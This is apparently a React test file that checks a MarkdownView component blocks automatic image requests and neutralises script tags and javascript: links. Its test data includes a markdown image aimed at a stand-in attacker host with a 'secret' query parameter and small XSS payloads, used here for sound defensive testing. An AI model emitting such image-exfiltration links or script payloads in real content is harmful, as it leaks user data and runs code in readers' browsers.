import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { MarkdownView } from "./MarkdownView";

describe("MarkdownView security", () => {
  it("does not render images (no automatic network requests) and shows a safe link instead", () => {
    const { container } = render(<MarkdownView>{"![leak](https://evil.example/x.png?d=secret)"}</MarkdownView>);

    expect(container.querySelector("img")).toBeNull();
    const link = screen.getByRole("link", { name: /leak/ });
    expect(link).toHaveAttribute("href", "https://evil.example/x.png?d=secret");
    expect(link).toHaveAttribute("rel", "noopener noreferrer");
    expect(link).toHaveAttribute("target", "_blank");
  });

  it("keeps script tags and javascript: links inert", () => {
    const { container } = render(
      <MarkdownView>
        {"<script>alert(1)</script>\n\n[click](javascript:alert(1))\n\n![x](javascript:alert(2))"}
      </MarkdownView>,
    );

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    for (const a of container.querySelectorAll("a")) {
      expect(a.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
    }
  });
});
